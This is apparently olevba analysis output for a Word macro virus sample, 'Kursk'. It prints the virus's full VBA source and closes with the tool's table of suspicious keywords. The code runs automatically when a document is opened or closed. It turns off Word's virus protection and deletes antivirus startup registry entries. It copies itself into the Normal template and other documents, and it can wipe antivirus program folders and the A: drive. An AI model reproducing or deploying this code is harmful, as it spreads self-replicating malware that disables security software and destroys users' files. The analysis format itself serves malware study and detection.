olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Krusk-dd48e671ec3dbe8f4d8c304423bff6ab0ac40348
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Krusk-dd48e671ec3dbe8f4d8c304423bff6ab0ac40348 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kursk.bas 
in file: Virus.MSWord.Krusk-dd48e671ec3dbe8f4d8c304423bff6ab0ac40348 - OLE stream: 'Macros/VBA/Kursk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Rem QUESTO CODICE SERVE PER DISATTIVARE LE AUTO PROTEZIONI DEI VARI ANTIVIRUS
Options.VirusProtection = False
On Error Resume Next
Norton:
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Norton Auto-Protect"
Mcafee:
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Vshwin32EXE"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VsStatEXE"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\McAfeeWebScanX"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AvconsoleEXE"
Pc_cillin:
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PCCIOMON.EXE"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\pop3trap.exe"
regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebTrap.exe"
AVP:
GoTo Panda
'L'AVP NON HA L'AUTOPROTEZIONE CHE SI CARICA ALL'AVVIO SE CI SBAGLIANO PERCHE' NON CI CONTATTI
Panda:
regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ScanInicio"
regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\APVXDWIN"
If Day(Now) = 31 Then
WordBasic.MsgBox "~ 4B5552534B:4445434:4D41434B ~", vbCritical
Call AutoClose
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: Application.Quit
End If
End Sub
Private Sub regdelete(regkey)
Set regedit = CreateObject("WScript.Shell")
regedit.regdelete regkey
End Sub
Sub AutoClose()
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item("Kursk").Name <> "Kursk" Then
NORMALNONINFETTO = True
ActiveDocument.VBProject.VBComponents("Kursk").Export "C:\Windows\Kursk.vxd"
Set INFECT = NormalTemplate.VBProject
End If
If ActiveDocument.VBProject.VBComponents.Item("Kursk").Name <> "Kursk" Then
DOCUMENTINONINFETTI = True
NormalTemplate.VBProject.VBComponents("Kursk").Export "C:\Windows\Kursk.vxd"
Set INFECT = ActiveDocument.VBProject
End If
If NORMALNONINFETTO = True Or DOCUMENTINONINFETTI = True Then INFECT.VBComponents.Import "C:\Windows\Kursk.vxd"
Kill "C:\Windows\Kursk.vxd"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Antivirus:
Randomize
ns = Int((3 * Rnd) + 1)
If ns = 1 Then
GoTo Comment
ElseIf ns = 2 Then
GoTo Comment
ElseIf ns = 3 Then
Norton:
Kill "C:\Progra~1\Norton~1\*.*"
Set mso = CreateObject("Scripting.FilesystemObject")
Set fso = mso.CreateTextFile("C:\Progra~1\Norton~1\Norton.txt")
fso.WriteLine "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
fso.Close
Mcafee:
Kill "C:\Progra~1\Networ~1\Mcafee~1\*.*"
Set fsu = mso.CreateTextFile("C:\Progra~1\Networ~1\Mcafee~1\Mcafee.txt")
fsu.WriteLine "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
fsu.Close
Panda:
Kill "C:\Progra~1\Pandas~1\Pandaa~1\*.*"
Set pand = mso.CreateTextFile("C:\Progra~1\Pandas~1\Pandaa~1\Panda.txt")
pand.WriteLines "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
pand.Close
AVP:
Kill "C:\Progra~1\Antivi~1\*.*"
Set fsa = mso.CreateTextFile("C:\Progra~1\Antivi~1\Avp.txt")
fsa.WriteLine "THE KURSK IS DEATH IN THE SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
fsa.Close
Pc_cillin:
Kill "C:\Progra~1\Trendp~1\*.*"
Set pcl = mso.CreateTextFile("C:\Progra~1\Trend~1\Pc-Cillin.txt")
pcl.WriteLines "THE KURSK IS DEATH IN SEA, BUT ITS GHOST IS IN YOUR COMPUTER"
pcl.Close
End If
Comment:
'***************************************************************************
'*                                      THE KURSK                          *
'***************************************************************************
'* THE KURSK IS A NUCLEAR POWERED SUBMARINE, IT IS DEATH IN THE BARENT SEA *
'* WE DEDICATE IT AT YOU FOR REMENBER THE CAPTAIN AND ITS SEAMAN THAT NOW  *
'* THEY'RE DEATH WHIT THE SUBMARINE                                        *
'* THE KURSK IS NOW A MACRO VIRUS WRITTEN BY 4445434A & 4D41434B           *
'* THIS NEW MACRO VIRUS INFECT THE NORMAL TEMPLATE AND THE WORD'S DOCUMENT *
'* THE KURSK DELETE ALL KNOW ANTIVIRUS (NORTON, MCAFEE, PANDA, AVP         *
'* AND PC-CILLIN).                                                         *
'***************************************************************************
'*                                    AND MANY MORE ++                     *
'***************************************************************************
Randomize
ng = Int((10 * Rnd) + 1)
If ng = 1 Then
GoTo ENIF
ElseIf ng = 2 Then
GoTo ENIF
ElseIf ng = 3 Then
GoTo ENIF
ElseIf ng = 4 Then
GoTo ENIF
ElseIf ng = 5 Then
GoTo ENIF
ElseIf ng = 6 Then
GoTo ENIF
ElseIf ng = 7 Then
GoTo ENIF
ElseIf ng = 8 Then
GoTo ENIF
ElseIf ng = 9 Then
GoTo ENIF
ElseIf ng = 10 Then
Kill "A:\*.*"
Set writeindrivera = mso.CreateTextFile("A:\Kursk.txt")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.WriteLine ("   *                                THE KURSK                                *")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.WriteLine ("   * THE KURSK IS A NUCLEAR POWERED SUBMARINE, IT IS DEATH IN THE BARENT SEA *")
writeindrivera.WriteLine ("   * WE DEDICATE IT AT YOU FOR REMENBER THE CAPTAIN AND ITS SEAMAN THAT NOW  *")
writeindrivera.WriteLine ("   * THEY'RE DEATH WHIT THE SUBMARINE                                        *")
writeindrivera.WriteLine ("   * THE KURSK IS NOW A MACRO VIRUS WRITTEN BY 4445434A & 4D41434B           *")
writeindrivera.WriteLine ("   * THIS NEW MACRO VIRUS INFECT THE NORMAL TEMPLATE AND THE WORD'S DOCUMENT *")
writeindrivera.WriteLine ("   * THE KURSK DELETE ALL KNOW ANTIVIRUS (NORTON, MCAFEE, PANDA, AVP         *")
writeindrivera.WriteLine ("   * AND PC-CILLIN).                                                         *")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.WriteLine ("   *                              AND MANY MORE ++                           *")
writeindrivera.WriteLine ("   ***************************************************************************")
writeindrivera.Close
End If
ENIF: 'FINE
End Sub
Sub AutoNew() ' SI ATTIVA QUANDO SI APRE UN NUOVO DOCUMENTO
On Error Resume Next 'SU ERRORE VA AL PROSSIMO
Application.Assistant.Visible = True ' FA APPARIRE L'ASSISTANTE
Application.Assistant.Animation = msoAnimationGetTechy ' GLI FA ESEGUIRE UN'ANIMAZIONE
End Sub ' FINE DEL SOTTOPROGRAMMA
Rem if you find a bug please contact 4445434A & 4D41434B
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PCCIOMON.EXE        |Executable file name                         |
|IOC       |pop3trap.exe        |Executable file name                         |
|IOC       |WebTrap.exe         |Executable file name                         |
|Hex String|KURSK               |4B5552534B                                   |
|Hex String|MACK                |4D41434B                                     |
|Hex String|DECJ                |4445434A                                     |
+----------+--------------------+---------------------------------------------+
